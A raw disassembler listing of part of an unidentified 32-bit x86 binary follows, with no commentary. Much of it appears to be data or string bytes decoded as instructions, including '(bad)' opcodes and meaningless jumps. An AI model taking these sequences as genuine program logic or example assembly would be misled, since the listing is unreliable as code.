  423e37:	rol    BYTE PTR [edx+0x0],0x10
  423e3b:	rol    BYTE PTR [edx+0x0],0x14
  423e3f:	rol    BYTE PTR [edx+0x0],0x18
  423e43:	rol    BYTE PTR [edx+0x0],0x1c
  423e47:	rol    BYTE PTR [edx+0x0],0x75
  423e4b:	ins    DWORD PTR es:[edi],dx
  423e4c:	push   ecx
  423e4d:	push   eax
  423e4e:	jo     0x423eca
  423e50:	addr16 jo 0x423ea9
  423e53:	pop    eax
  423e54:	inc    ebp
  423e55:	push   edx
  423e56:	jb     0x423ecc
  423e58:	inc    esi
  423e59:	je     0x423ea2
  423e5b:	gs ins BYTE PTR es:[edi],dx
  423e5d:	dec    esp
  423e5e:	js     0x423ec8
  423e60:	inc    edx
  423e61:	js     0x423ea9
  423e63:	arpl   WORD PTR [edx+0x66],ax
  423e66:	inc    ebx
  423e67:	push   ebp
  423e68:	jno    0x423ee0
  423e6a:	push   es
  423e6b:	inc    edx
  423e6c:	inc    edx
  423e6d:	add    BYTE PTR [esi],cl
  423e6f:	inc    edx
  423e70:	inc    edx
  423e71:	add    BYTE PTR [edx-0x10ffbdc0],dh
  423e77:	or     esi,DWORD PTR [edx+0x304e790e]
  423e7d:	dec    esi
  423e7e:	xchg   DWORD PTR [edi+0x3d],ecx
  423e81:	dec    esi
  423e82:	scas   eax,DWORD PTR es:[edi]
  423e83:	dec    edi
  423e84:	ds dec esi
  423e86:	js     0x423ed6
  423e88:	cmp    ecx,DWORD PTR [esi-0x64]
  423e8b:	dec    edi
  423e8c:	inc    esp
  423e8d:	dec    esi
  423e8e:	jae    0x423ede
  423e90:	inc    ecx
  423e91:	dec    esi
  423e92:	xor    BYTE PTR [esi+0x40],cl
  423e95:	dec    esi
  423e96:	pop    esp
  423e97:	pop    ebp
  423e98:	pop    edi
  423e99:	push   edx
  423e9a:	cmp    DWORD PTR [esi+0x79],ecx
  423e9d:	dec    esi
  423e9e:	xor    BYTE PTR [esi-0x79],cl
  423ea1:	dec    edi
  423ea2:	cmp    eax,0x3e4faf4e
  423ea7:	dec    esi
  423ea8:	js     0x423ef8
  423eaa:	cmp    ecx,DWORD PTR [esi-0x64]
  423ead:	dec    edi
  423eae:	inc    esp
  423eaf:	dec    esi
  423eb0:	mov    DWORD PTR [edi+0x41],ecx
  423eb3:	dec    esi
  423eb4:	xor    BYTE PTR [esi+0x40],cl
  423eb7:	dec    esi
  423eb8:	pop    esp
  423eb9:	ins    DWORD PTR es:[edi],dx
  423eba:	pop    edi
  423ebb:	bound  edi,QWORD PTR [ecx]
  423ebd:	dec    esi
  423ebe:	jns    0x423f0e
  423ec0:	xor    BYTE PTR [esi-0x80],cl
  423ec3:	dec    edi
  423ec4:	cmp    eax,0x394e734e
  423ec9:	dec    esi
  423eca:	mov    ds:0x304e3a4f,al
  423ecf:	dec    esi
  423ed0:	inc    esi
  423ed1:	dec    esi
  423ed2:	pop    esp
  423ed3:	jge    0x423f34
  423ed5:	jb     0x423f46
  423ed7:	sub    BYTE PTR [esi-0x7d],0x7e
  423edb:	xchg   ebx,eax
  423edc:	jns    0x423e6e
  423ede:	aas    
  423edf:	dec    esi
  423ee0:	test   BYTE PTR [edi+0x30],cl
  423ee3:	dec    esi
  423ee4:	test   BYTE PTR [edi+0x3c],cl
  423ee7:	dec    esi
  423ee8:	mov    ds:0x734e394f,al
  423eed:	dec    esi
  423eee:	inc    ebp
  423eef:	dec    esi
  423ef0:	xor    BYTE PTR [esi+0x44],cl
  423ef3:	dec    esi
  423ef4:	pop    esp
  423ef5:	lea    ebx,[edi-0x7e]
  423ef8:	outs   dx,DWORD PTR ds:[esi]
  423ef9:	xchg   edx,eax
  423efa:	outs   dx,BYTE PTR ds:[esi]
  423efb:	xchg   ebx,eax
  423efc:	jle    0x423ea1
  423efe:	jns    0x423ea0
  423f00:	aas    
  423f01:	dec    esi
  423f02:	test   BYTE PTR [edi+0x30],cl
  423f05:	dec    esi
  423f06:	test   BYTE PTR [edi+0x3c],cl
  423f09:	dec    esi
  423f0a:	mov    ds:0x894e394f,al
  423f0f:	dec    edi
  423f10:	inc    ebp
  423f11:	dec    esi
  423f12:	xor    BYTE PTR [esi+0x44],cl
  423f15:	dec    esi
  423f16:	pop    esp
  423f17:	popf   
  423f18:	pop    edi
  423f19:	xchg   edx,eax
  423f1a:	outs   dx,DWORD PTR ds:[esi]
  423f1b:	mov    ds:0xb37ea36e,al
  423f20:	jns    0x423ed2
  423f22:	aas    
  423f23:	dec    esi
  423f24:	mov    cs,WORD PTR [edi+0x30]
  423f27:	dec    esi
  423f28:	lods   al,BYTE PTR ds:[esi]
  423f29:	dec    edi
  423f2a:	cmp    eax,0x394e734e
  423f2f:	dec    esi
  423f30:	mov    eax,ds:0x304e3a4f
  423f35:	dec    esi
  423f36:	inc    esp
  423f37:	dec    esi
  423f38:	pop    esp
  423f39:	lods   eax,DWORD PTR ds:[esi]
  423f3a:	pop    edi
  423f3b:	mov    ds:0xb36eb26f,al
  423f40:	jle    0x423f05
  423f42:	jns    0x423f04
  423f44:	aas    
  423f45:	dec    esi
  423f46:	mov    cs,WORD PTR [edi+0x30]
  423f49:	dec    esi
  423f4a:	lods   al,BYTE PTR ds:[esi]
  423f4b:	dec    edi
  423f4c:	cmp    eax,0x394e7e4e
  423f51:	dec    esi
  423f52:	lahf   
  423f53:	dec    edi
  423f54:	cmp    ecx,DWORD PTR [esi+0x30]
  423f57:	dec    esi
  423f58:	inc    ebp
  423f59:	dec    esi
  423f5a:	pop    esp
  423f5b:	mov    ebp,0xc26fb25f
  423f60:	outs   dx,BYTE PTR ds:[esi]
  423f61:	ret    
  423f62:	jle    0x423f37
  423f64:	jns    0x423f36
  423f66:	aas    
  423f67:	dec    esi
  423f68:	mov    cs,WORD PTR [edi+0x30]
  423f6b:	dec    esi
  423f6c:	lods   al,BYTE PTR ds:[esi]
  423f6d:	dec    edi
  423f6e:	cmp    eax,0x394f804e
  423f73:	dec    esi
  423f74:	lods   al,BYTE PTR ds:[esi]
  423f75:	dec    edi
  423f76:	cmp    cl,BYTE PTR [esi+0x30]
  423f79:	dec    esi
  423f7a:	inc    esi
  423f7b:	dec    esi
  423f7c:	pop    esp
  423f7d:	int    0x5f
  423f7f:	ret    0xd26f
  423f82:	outs   dx,BYTE PTR ds:[esi]
  423f83:	sar    DWORD PTR [esi-0x1d],cl
  423f86:	jns    0x423f68
  423f88:	aas    
  423f89:	dec    esi
  423f8a:	mov    cs,WORD PTR [edi+0x30]
  423f8d:	dec    esi
  423f8e:	lods   al,BYTE PTR ds:[esi]
  423f8f:	dec    edi
  423f90:	cmp    eax,0x394f834e
  423f95:	dec    esi
  423f96:	mov    ds:0x304e3a4f,al
  423f9b:	dec    esi
  423f9c:	inc    esp
  423f9d:	dec    esi
  423f9e:	pop    esp
  423f9f:	fstp   QWORD PTR [edi-0x2e]
  423fa2:	outs   dx,DWORD PTR ds:[esi]
  423fa3:	loop   0x424013
  423fa5:	jecxz  0x424025
  423fa7:	repz jns 0x423f9a
  423faa:	aas    
  423fab:	dec    esi
  423fac:	lea    ecx,[edi+0x30]
  423faf:	dec    esi
  423fb0:	lahf   
  423fb1:	dec    edi
  423fb2:	cmp    eax,0x3c4fa04e
  423fb7:	dec    esi
  423fb8:	xor    BYTE PTR [esi+0x3f],cl
  423fbb:	dec    esi
  423fbc:	pop    esp
  423fbd:	in     eax,dx
  423fbe:	pop    edi
  423fbf:	loop   0x424030
  423fc1:	repnz outs dx,BYTE PTR ds:[esi]
  423fc3:	repz jle 0x423fc9
  423fc6:	jns    0x423fc8
  423fc8:	jle    0x423fdd
  423fca:	jns    0x423fdc
  423fcc:	cmp    al,0x4e
  423fce:	jg     0x42401e
  423fd0:	xor    BYTE PTR [esi-0x65],cl
  423fd3:	dec    edi
  423fd4:	xor    cl,BYTE PTR [esi-0x80]
  423fd7:	dec    edi
  423fd8:	cmp    al,0x4e
  423fda:	lods   eax,DWORD PTR ds:[esi]
  423fdb:	dec    edi
  423fdc:	cmp    ecx,DWORD PTR [esi+0x30]
  423fdf:	dec    esi
  423fe0:	inc    ebp
  423fe1:	dec    esi
  423fe2:	pop    esp
  423fe3:	or     eax,0x126f025f
  423fe8:	outs   dx,BYTE PTR ds:[esi]
  423fe9:	adc    edi,DWORD PTR [esi+0x23]
  423fec:	jns    0x42400e
  423fee:	aas    
  423fef:	dec    esi
  423ff0:	add    BYTE PTR [eax],al
  423ff2:	jp     0x424032
  423ff4:	inc    edx
  423ff5:	add    BYTE PTR [esi+0x40],ch
  423ff8:	inc    edx
  423ff9:	add    BYTE PTR [esi+0x40],dh
  423ffc:	inc    edx
  423ffd:	add    BYTE PTR [edx],dl
  423fff:	inc    edx
  424000:	inc    edx
  424001:	add    BYTE PTR [edx+0x41],bh
  424004:	inc    edx
  424005:	add    BYTE PTR [edx],al
  424007:	inc    edx
  424008:	inc    edx
  424009:	add    BYTE PTR [esi+0x40],dl
  42400c:	inc    edx
  42400d:	add    BYTE PTR [edx+0x40],bl
  424010:	inc    edx
  424011:	add    dh,bh
  424013:	inc    ecx
  424014:	inc    edx
  424015:	add    BYTE PTR [esi+0xd004240],bh
  42401b:	test   eax,0xba36f89c
  424020:	pushf  
  424021:	clc    
  424022:	jb     0x424064
  424024:	inc    edx
  424025:	add    BYTE PTR [esi],dh
  424027:	inc    ecx
  424028:	inc    edx
  424029:	add    BYTE PTR [edx+0x41],cl
  42402c:	inc    edx
  42402d:	add    BYTE PTR [esi+0x41],dl
  424030:	inc    edx
  424031:	add    BYTE PTR [esi+0x41],ah
  424034:	inc    edx
  424035:	add    BYTE PTR [edx+0x76004240],ch
  42403b:	ds inc edx
  42403d:	add    dl,cl
  42403f:	inc    eax
  424040:	inc    edx
  424041:	add    BYTE PTR [edx+0x16004240],bh
  424047:	inc    edx
  424048:	inc    edx
  424049:	add    BYTE PTR [esi+0x19f89c85],dh
  42404f:	or     edx,DWORD PTR [edi]
  424051:	cmp    DWORD PTR [esi+0x40],0x1c140042
  424058:	push   ss
  424059:	or     DWORD PTR [eax],0x7050d
  42405f:	add    BYTE PTR [eax+0x0],al
  424062:	cmp    al,BYTE PTR [edx+0x3e]
  424065:	ds mov edx,0x6d004287
  42406b:	push   ebp
  42406c:	inc    esp
  42406d:	imul   ecx,DWORD PTR [eax],0x86275fa
  424073:	in     eax,dx
  424074:	inc    BYTE PTR [edi]
  424076:	aas    
  424077:	cli    
  424078:	mov    ds:0x42406605,eax
  42407d:	add    BYTE PTR [ebp-0x4a07636b],dh
  424083:	xchg   esi,eax
  424084:	pushf  
  424085:	clc    
  424086:	mov    ah,0x95
  424088:	pushf  
  424089:	clc    
  42408a:	mov    ebx,0xbaf89c95
  42408f:	xchg   ebp,eax
  424090:	pushf  
  424091:	clc    
  424092:	mov    ecx,0xb8f89c95
  424097:	xchg   ebp,eax
  424098:	pushf  
  424099:	clc    
  42409a:	mov    edi,0xbef89c95
  42409f:	xchg   ebp,eax
  4240a0:	pushf  
  4240a1:	clc    
  4240a2:	mov    ebp,0xa6f89c95
  4240a7:	xchg   ebp,eax
  4240a8:	pushf  
  4240a9:	clc    
  4240aa:	jmp    0x423e:0x6e6003f9
  4240b1:	add    BYTE PTR [eax+edx*2+0x42],bh
  4240b5:	add    BYTE PTR [ebx+0x77],dl
  4240b8:	jbe    0x42410a
  4240ba:	mov    dh,0x85
  4240bc:	pushf  
  4240bd:	clc    
  4240be:	sbb    ecx,ebp
  4240c0:	push   eax
  4240c1:	pop    es
  4240c2:	in     eax,0x7
  4240c4:	add    BYTE PTR [eax],al
  4240c6:	push   0x3e
  4240c8:	inc    edx
  4240c9:	add    BYTE PTR [ebx],bl
  4240cb:	or     eax,DWORD PTR [esi+ecx*1]
	...
  4240fe:	jl     0x424150
  424100:	inc    edx
  424101:	add    BYTE PTR [esi+0x68f89c85],dh
  424107:	jne    0x424182
  424109:	je     0x424180
  42410b:	jns    0x424181
  42410d:	jb     0x424177
  42410f:	addr16 pushw 0x68
  424113:	imul   esp,DWORD PTR [bx+0x68],0x0
  424118:	add    BYTE PTR [eax],al
  42411a:	addr16 pushw 0x68
  42411e:	addr16 push 0x67
  424121:	pushw  0x6b6a
  424125:	push   0x676b67
	...
  424132:	jle    0x4240ba
  424134:	inc    eax
  424135:	add    BYTE PTR [ebp-0x5db060b1],ah
  42413b:	dec    edi
  42413c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42413d:	dec    edi
  42413e:	lahf   
  42413f:	dec    edi
  424140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424141:	dec    edi
  424142:	ins    DWORD PTR es:[edi],dx
  424143:	dec    esi
  424144:	bound  ecx,QWORD PTR [esi+0x30]
  424147:	dec    esi
  424148:	add    BYTE PTR [eax],al
  42414a:	cdq    
  42414b:	dec    edi
  42414c:	pushf  
  42414d:	dec    edi
  42414e:	fwait
  42414f:	dec    edi
  424150:	ins    DWORD PTR es:[edi],dx
  424151:	dec    esi
  424152:	bound  ecx,QWORD PTR [esi+0x30]
  424155:	dec    esi
  424156:	scas   eax,DWORD PTR es:[edi]
  424157:	dec    edi
  424158:	lods   eax,DWORD PTR ds:[esi]
  424159:	dec    edi
  42415a:	lahf   
  42415b:	dec    edi
  42415c:	mov    ds:0x624e6d4f,al
  424161:	dec    esi
  424162:	xor    BYTE PTR [esi+0x0],cl
  424165:	add    BYTE PTR [ebp-0x5bb067b1],ch
  42416b:	dec    edi
  42416c:	test   eax,0xa04f934f
  424171:	dec    edi
  424172:	fwait
  424173:	dec    edi
  424174:	xor    BYTE PTR [esi+0x0],cl
  424177:	add    BYTE PTR [eax],al
  424179:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  424180:	mov    WORD PTR [ebp-0x32734274],gs
  424186:	mov    ebp,ds
  424188:	mov    ebp,gs
  42418a:	mov    ebp,?
  42418c:	mov    WORD PTR ds:0x2d8c1d8c,cs
  424192:	mov    WORD PTR ds:0x6d8c5d8c,?
  424198:	mov    WORD PTR [edx-0x74],?
  42419b:	jae    0x424129
  42419d:	jo     0x42412b
  42419f:	jno    0x42412d
  4241a1:	jbe    0x42412f
  4241a3:	ja     0x424131
  4241a5:	je     0x424133
  4241a7:	jne    0x424135
  4241a9:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  4241b0:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  4241b6:	lods   al,BYTE PTR ds:[esi]
  4241b7:	jge    0x424175
  4241b9:	jge    0x424159
  4241bb:	(bad)  
  4241bc:	jns    0x424231
  4241be:	mov    ecx,0x7d738cb1
  4241c3:	ins    DWORD PTR es:[edi],dx
  4241c4:	enter  0x9fc6,0x26
  4241c8:	jb     0x4241cd
  4241ca:	test   eax,0xb956bb17
  4241cf:	hlt    
  4241d0:	test   al,0x37
  4241d2:	test   al,0x7e
  4241d4:	fnstenv [ecx-0x6a]
  4241d7:	mov    cl,0x6a
  4241d9:	push   0xffffffce
  4241db:	or     BYTE PTR [edx],bl
  4241dd:	xlat   BYTE PTR ds:[ebx]
  4241de:	out    dx,eax
  4241df:	add    eax,0x9321d7aa
  4241e4:	scas   al,BYTE PTR es:[edi]
  4241e5:	adc    DWORD PTR [esi],esp
  4241e7:	jge    0x42420c
  4241e9:	fidiv  WORD PTR [edi]
  4241eb:	leave  
  4241ec:	hlt    
  4241ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241ee:	cmp    ax,0x1fc8
  4241f2:	mov    dh,cl
  4241f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4241f5:	(bad)  
  4241f6:	and    DWORD PTR [eax],ebx
  4241f8:	and    DWORD PTR [ecx+0x0],esi
  4241fb:	add    BYTE PTR [eax],al
  4241fd:	add    al,ch
  4241ff:	(bad)  [ebx+0x7]
  424202:	cmc    
  424203:	enter  0x301a,0x10
  424207:	push   eax
  424208:	inc    edx
  424209:	add    BYTE PTR [ecx+0x66],dh
  42420c:	jp     0x42427c
  42420e:	pop    esi
  42420f:	inc    eax
  424210:	inc    edx
  424211:	add    dl,al
  424213:	inc    eax
  424214:	inc    edx
  424215:	add    BYTE PTR [eax],cl
  424217:	in     eax,dx
  424218:	adc    al,BYTE PTR [edi]
  42421a:	pop    ecx
  42421b:	inc    ebx
  42421c:	inc    edx
  42421d:	outs   dx,BYTE PTR ds:[esi]
  42421e:	popa   
  42421f:	imul   eax,DWORD PTR [edx+0x61],0x6b
  424223:	jne    0x424293
  424225:	dec    ebx
  424226:	je     0x42428b
  424228:	bound  esp,QWORD PTR [edi+0x78]
  42422b:	dec    eax
  42422c:	bound  edx,QWORD PTR [ebx+0x53]
  42422f:	inc    ebx
  424230:	push   ebp
  424231:	push   eax
  424232:	ja     0x4242ae
  424234:	jp     0x424283
  424236:	push   esi
  424237:	arpl   WORD PTR gs:[ecx+0x45],si
  42423b:	dec    edx
  42423c:	dec    esi
  42423d:	data16 ja 0x42428e
  424240:	imul   ebp,DWORD PTR [eax+0x0],0x0
	...
  424253:	add    BYTE PTR [eax],al
  424255:	add    BYTE PTR [edi+0x6c],ch
  424258:	push   0x49657557
  42425d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  424263:	push   edi
  424264:	je     0x4242db
  424266:	push   0x66
  424268:	jbe    0x4242ac
  42426a:	jo     0x4242b5
  42426c:	dec    ebp
  42426d:	dec    ebp
  42426e:	pop    edx
  42426f:	jp     0x4242cb
  424271:	jbe    0x4242b9
  424273:	pop    ecx
  424274:	jo     0x4242ee
  424276:	push   edi
  424277:	jbe    0x4242c0
  424279:	ja     0x4242be
  42427b:	js     0x4242c5
  42427d:	jno    0x4242c7
  42427f:	inc    ebp
  424280:	inc    esp
  424281:	inc    esp
  424282:	push   ecx
  424283:	dec    edx
  424284:	ins    BYTE PTR es:[edi],dx
  424285:	dec    ebx
  424286:	jbe    0x4242f6
  424288:	pop    eax
  424289:	jbe    0x42428b
  42428b:	add    BYTE PTR [ecx+0x46],al
  42428e:	jae    0x424306
  424290:	dec    ebx
  424291:	gs js  0x4242fa
  424294:	ins    BYTE PTR es:[edi],dx
  424295:	jp     0x424297
  424297:	add    BYTE PTR [ebx+0x41],cl
  42429a:	fs gs jno 0x42430b
  42429e:	push   ebx
  42429f:	inc    ecx
  4242a0:	inc    ebx
  4242a1:	outs   dx,BYTE PTR ds:[esi]
  4242a2:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  4242a6:	push   edx
  4242a7:	push   ecx
  4242a8:	push   0x43000064
  4242ad:	pop    eax
  4242ae:	outs   dx,DWORD PTR ds:[esi]
  4242af:	push   0x66694355
  4242b4:	dec    edi
  4242b5:	je     0x424303
  4242b7:	jo     0x4242b9
  4242b9:	add    BYTE PTR [ebx+0x6f],dl
  4242bc:	inc    edi
  4242bd:	dec    esi
  4242be:	outs   dx,DWORD PTR ds:[esi]
  4242bf:	pop    ecx
  4242c0:	inc    edi
  4242c1:	jb     0x42430a
  4242c3:	jns    0x42433b
  4242c5:	inc    ecx
  4242c6:	pop    eax
  4242c7:	add    BYTE PTR [edi+0x67],dh
  4242ca:	dec    edi
  4242cb:	dec    esp
  4242cc:	dec    ebp
  4242cd:	inc    edx
  4242ce:	jno    0x424341
  4242d0:	jae    0x424325
  4242d2:	push   eax
  4242d3:	arpl   WORD PTR [eax],ax
  4242d5:	add    BYTE PTR [ecx+edi*2+0x45],cl
  4242d9:	bound  ebp,QWORD PTR [ecx+0x46]
  4242dc:	dec    ecx
  4242dd:	ja     0x424324
  4242df:	dec    eax
  4242e0:	inc    ebp
  4242e1:	inc    edx
  4242e2:	push   ebx
  4242e3:	push   ecx
  4242e4:	add    BYTE PTR [eax],al
  4242e6:	outs   dx,BYTE PTR ds:[esi]
  4242e7:	dec    eax
  4242e8:	jno    0x424343
  4242ea:	jbe    0x424338
  4242ec:	ins    BYTE PTR es:[edi],dx
  4242ed:	inc    edx
  4242ee:	push   0x73
  4242f3:	add    BYTE PTR [eax],al
  4242f5:	add    BYTE PTR [eax],al
  4242f7:	add    BYTE PTR [eax],al
  4242f9:	add    BYTE PTR [edx+0x44],bl
  4242fc:	jbe    0x424347
  4242fe:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  424302:	ins    DWORD PTR es:[di],dx
  424304:	je     0x42434d
  424306:	ins    BYTE PTR es:[edi],dx
  424307:	jae    0x424373
  424309:	inc    esi
  42430a:	ins    DWORD PTR es:[edi],dx
  42430b:	je     0x424363
  42430d:	push   0x56584178
  424312:	push   ebx
  424313:	addr16 dec edx
  424315:	jo     0x424389
  424317:	js     0x424388
  424319:	pop    eax
  42431a:	dec    ebx
  42431b:	push   esp
  42431c:	dec    esp
  42431d:	jns    0x42436a
  42431f:	js     0x424399
  424321:	outs   dx,BYTE PTR ds:[esi]
  424322:	pop    ecx
  424323:	jae    0x424393
  424325:	push   0x43644448
  42432a:	arpl   WORD PTR [edx+0x55],sp
  42432d:	push   0x42504e67
  424332:	push   ebp
  424333:	je     0x4243aa
  424335:	addr16 dec edi
  424337:	dec    esp
  424338:	inc    edx
  424339:	ins    DWORD PTR es:[edi],dx
  42433a:	inc    esi
  42433b:	inc    esi
  42433c:	inc    esi
  42433d:	arpl   WORD PTR [edx+0x47],bx
  424340:	push   ebp
  424341:	inc    ebx
  424342:	popa   
  424343:	push   edx
  424344:	dec    esp
  424345:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  42434c:	push   ecx
  42434d:	push   ebx
  42434e:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  424355:	dec    edx
  424356:	jns    0x4243c1
  424358:	push   edx
  424359:	inc    ebx
  42435a:	jo     0x4243d1
  42435c:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  424360:	fs add al,dl
  424363:	inc    edx
  424364:	add    BYTE PTR [eax+edx*8],al
  424367:	inc    edx
  424368:	add    BYTE PTR [eax],cl
  42436a:	rol    BYTE PTR [edx+0x0],1
  42436d:	or     al,0xd0
  42436f:	inc    edx
  424370:	add    BYTE PTR [eax],dl
  424372:	rol    BYTE PTR [edx+0x0],1
  424375:	adc    al,0xd0
  424377:	inc    edx
  424378:	add    BYTE PTR [eax],bl
  42437a:	rol    BYTE PTR [edx+0x0],1
  42437d:	sbb    al,0xd0
  42437f:	inc    edx
  424380:	add    BYTE PTR [edi+0x37],al
  424383:	cmp    BYTE PTR [edi+0x4b],bl
  424386:	inc    ecx
  424387:	aaa    
  424388:	dec    ecx
  424389:	ss pop edi
  42438b:	xor    BYTE PTR [eax+0x35],dl
  42438e:	dec    esi
  42438f:	add    BYTE PTR [eax+0x49],cl
  424392:	xor    al,0x5f
  424394:	dec    esp
  424395:	inc    esp
  424396:	dec    esp
  424397:	xor    bl,BYTE PTR [edi+0x35]
  42439a:	dec    eax
  42439b:	xor    BYTE PTR [eax],al
  42439d:	dec    esp
  42439e:	inc    ecx
  42439f:	xor    al,0x5f
  4243a1:	dec    ebx
  4243a2:	pop    edx
  4243a3:	xor    esi,DWORD PTR [ebx]
  4243a5:	dec    ebp
  4243a6:	pop    edi
  4243a7:	xor    al,0x0
  4243a9:	pop    ecx
  4243aa:	inc    esi
  4243ab:	push   eax
  4243ac:	aaa    
  4243ad:	xor    DWORD PTR [edx],esi
  4243af:	pop    edi
  4243b0:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  4243b4:	xor    eax,0x33595f41
  4243b9:	aaa    
  4243ba:	push   edx
  4243bb:	xor    bl,BYTE PTR [edi+0x4c]
  4243be:	pop    edx
  4243bf:	add    BYTE PTR [edx+0x45],cl
  4243c2:	push   ebx
  4243c3:	xor    DWORD PTR [edi+0x43],ebx
  4243c6:	dec    esp
  4243c7:	inc    esi
  4243c8:	add    BYTE PTR [eax+0x58],bl
  4243cb:	xor    eax,0x444e515f
  4243d0:	xor    eax,0x4300425f
  4243d5:	inc    ecx
  4243d6:	dec    ebx
  4243d7:	cmp    DWORD PTR ds:0x365f3939,esi
  4243dd:	xor    al,0x42
  4243df:	pop    edi
  4243e0:	pop    eax
  4243e1:	push   edi
  4243e2:	add    BYTE PTR [ebx+0x45],cl
  4243e5:	cmp    DWORD PTR ss:[edi+0x56],ebx
  4243e9:	xor    eax,DWORD PTR [esi+0x4c]
  4243ec:	add    BYTE PTR [ebp+0x53],cl
  4243ef:	dec    edi
  4243f0:	pop    edi
  4243f1:	push   ebx
  4243f2:	inc    ebx
  4243f3:	xor    al,0x5f
  4243f5:	inc    ebx
  4243f6:	push   ebp
  4243f7:	xor    eax,DWORD PTR [ecx+0x0]
  4243fa:	dec    esi
  4243fb:	inc    esi
  4243fc:	xor    eax,0x494f345f
  424401:	xor    ecx,DWORD PTR [esi+0x5f]
  424404:	push   esp
  424405:	cmp    BYTE PTR [esi+0x0],dl
  424408:	pop    edx
  424409:	xor    esi,DWORD PTR [esi]
  42440b:	aaa    
  42440c:	pop    edi
  42440d:	xor    eax,0x5f363437
  424412:	push   edi
  424413:	add    BYTE PTR [ebp+0x4a],cl
  424416:	push   edx
  424417:	pop    edi
  424418:	xor    DWORD PTR [edx],esi
  42441a:	inc    ebp
  42441b:	inc    edx
  42441c:	ss pop edi
  42441e:	inc    ecx
  42441f:	dec    ebx
  424420:	add    BYTE PTR [edx+0x54],cl
  424423:	dec    edi
  424424:	pop    edi
  424425:	push   esp
  424426:	cmp    BYTE PTR [eax],dh
  424428:	inc    edi
  424429:	add    BYTE PTR [ecx+esi*1+0x4d],al
  42442d:	pop    edi
  42442e:	xor    DWORD PTR [ebp+0x57],eax
  424431:	pop    edx
  424432:	cmp    BYTE PTR ss:[edi+0x38],bl
  424436:	inc    ebp
  424437:	dec    edi
  424438:	add    BYTE PTR [eax+0x53],cl
  42443b:	xor    DWORD PTR [ecx],edi
  42443d:	pop    edi
  42443e:	dec    ebx
  42443f:	inc    edx
  424440:	push   esp
  424441:	pop    edi
  424442:	push   esi
  424443:	add    BYTE PTR [ecx+0x49],al
  424446:	dec    edx
  424447:	pop    edi
  424448:	xor    eax,0x33344d4d
  42444d:	pop    edi
  42444e:	push   ecx
  42444f:	inc    esi
  424450:	inc    edi
  424451:	dec    edi
  424452:	add    BYTE PTR [esi+0x4b],dl
  424455:	push   edx
  424456:	pop    edi
  424457:	inc    ebx
  424458:	pop    ecx
  424459:	xor    ebx,DWORD PTR [edi+0x35]
  42445c:	inc    edi
  42445d:	dec    eax
  42445e:	xor    BYTE PTR [edx+0x0],al
  424461:	push   esi
  424462:	xor    eax,0x315f3452
  424467:	ss inc esp
  424469:	xor    eax,0x5956004a
  42446e:	inc    ecx
  42446f:	pop    edi
  424470:	push   esi
  424471:	push   ebp
  424472:	inc    ebp
  424473:	pop    edi
  424474:	xor    BYTE PTR [ecx],dh
  424476:	add    BYTE PTR [edi+0x58],al
  424479:	dec    edx
  42447a:	pop    edi
  42447b:	inc    edi
  42447c:	inc    esi
  42447d:	push   esi
  42447e:	dec    esp
  42447f:	push   edi
  424480:	add    BYTE PTR [edi+0x35],al
  424483:	dec    ebx
  424484:	pop    edi
  424485:	ss dec ebx
  424487:	xor    esi,DWORD PTR ds:0x33005600
  42448d:	add    BYTE PTR [edi+0x0],dl
  424490:	xor    eax,0x5f003600
  424495:	add    BYTE PTR [ecx+0x0],bl
  424498:	dec    eax
  424499:	add    BYTE PTR [ecx+0x0],bl
  42449c:	inc    ebp
  42449d:	add    BYTE PTR [eax+0x0],cl
  4244a0:	add    BYTE PTR [eax],al
  4244a2:	push   eax
  4244a3:	add    BYTE PTR [eax],dh
  4244a5:	add    BYTE PTR [ecx+0x0],bl
  4244a8:	pop    edi
  4244a9:	add    BYTE PTR [ecx+0x0],bl
  4244ac:	xor    al,BYTE PTR [eax]
  4244ae:	dec    edi
  4244af:	add    BYTE PTR [ebx],dh
  4244b1:	add    BYTE PTR [edi+0x0],dl
  4244b4:	pop    edi
  4244b5:	add    BYTE PTR [eax+eax*1+0x4f],al
  4244b9:	add    BYTE PTR [ebx+0x0],dl
  4244bc:	add    BYTE PTR [eax],al
  4244be:	dec    ebp
  4244bf:	add    BYTE PTR [esi+0x0],dl
  4244c2:	push   esp
  4244c3:	add    BYTE PTR [edi+0x0],bl
  4244c6:	inc    edx
  4244c7:	add    BYTE PTR [edx+0x0],dl
  4244ca:	xor    al,0x0
  4244cc:	pop    edi
  4244cd:	add    BYTE PTR [ecx+0x0],al
  4244d0:	push   esp
  4244d1:	add    BYTE PTR [edx+0x0],dl
  4244d4:	pop    edi
  4244d5:	add    BYTE PTR [edi+0x0],cl
  4244d8:	xor    eax,DWORD PTR [eax]
  4244da:	inc    edx
  4244db:	add    BYTE PTR [eax],al
  4244dd:	add    BYTE PTR [esi+0x0],cl
  4244e0:	cmp    BYTE PTR [eax],al
  4244e2:	push   eax
  4244e3:	add    BYTE PTR [eax],dh
  4244e5:	add    BYTE PTR [edi+0x0],bl
  4244e8:	push   edx
  4244e9:	add    BYTE PTR [edi+0x0],al
  4244ec:	inc    edx
  4244ed:	add    BYTE PTR [eax],bh
  4244ef:	add    BYTE PTR [eax+eax*1],dh
  4244f2:	pop    edi
  4244f3:	add    BYTE PTR [edi+0x0],cl
  4244f6:	push   eax
  4244f7:	add    BYTE PTR [esi],dh
  4244f9:	add    BYTE PTR [eax],al
  4244fb:	add    BYTE PTR [edx+0x0],bl
  4244fe:	pop    eax
  4244ff:	add    BYTE PTR [ecx],dh
  424501:	add    BYTE PTR [eax],bh
  424503:	add    BYTE PTR [edi+0x0],bl
  424506:	push   edi
  424507:	add    BYTE PTR [edx+0x0],dl
  42450a:	dec    ebx
  42450b:	add    BYTE PTR [edi+0x0],bl
  42450e:	inc    esp
  42450f:	add    BYTE PTR [esi],dh
  424511:	add    BYTE PTR [ecx],bh
